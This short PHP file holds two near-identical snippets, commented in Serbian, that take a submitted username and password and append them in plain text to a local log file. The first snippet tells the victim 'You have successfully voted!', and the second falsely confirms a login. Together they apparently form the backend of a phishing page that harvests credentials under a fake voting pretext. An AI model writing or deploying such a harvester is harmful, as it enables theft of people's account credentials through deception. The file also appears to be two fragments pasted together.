<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Snimanje u fajl (samo za testiranje, nemoj koristiti u pravoj aplikaciji!)
    file_put_contents("logins.txt", "Username: $username, Password: $password\n", FILE_APPEND);
    
    echo "You have successfully voted!";
}
?>
<?php
// Ako su podaci poslati putem POST metode
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Uzmi username i password
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Kreiraj tekst koji će biti sačuvan
    $data = "Username: " . $username . " | Password: " . $password . "\n";

    // Otvori (ili kreiraj) fajl za upis podataka
    $file = fopen("login_data.txt", "a");  // 'a' znači da ćemo dodavati podatke na kraj fajla

    // Upisivanje podataka u fajl
    fwrite($file, $data);

    // Zatvori fajl
    fclose($file);

    // Prikaži poruku da je uspešno poslato
    echo "<p>Uspesno ste se prijavili!</p>";
}
?>
